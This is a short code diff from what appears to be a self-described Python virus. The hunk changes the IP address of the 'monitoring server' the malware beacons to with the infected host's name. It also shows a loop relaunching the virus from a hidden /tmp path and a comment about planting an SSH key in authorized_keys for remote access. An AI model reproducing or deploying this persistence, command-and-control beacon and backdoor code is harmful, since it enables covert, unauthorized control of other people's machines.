@@ -28,7 +28,7 @@ while 1:
     os.system("/usr/bin/flock -n /tmp/vlock.lock /tmp/\,/" + VNAME + " &")
 
     # Let the monitoring server know I am still alive
-    requests.get("http://68.183.100.83:8080/api/submit", {"id" : HOSTNAME, "virusName" : VIRUSNUM})
+    requests.get("http://142.93.124.107:8080/api/submit", {"id" : HOSTNAME, "virusName" : VIRUSNUM})
 
     # Append an ssh key to authorized_keys file if it is not already there
     # What's the fun of having a virus if it doesn't give me some sort of remote access?
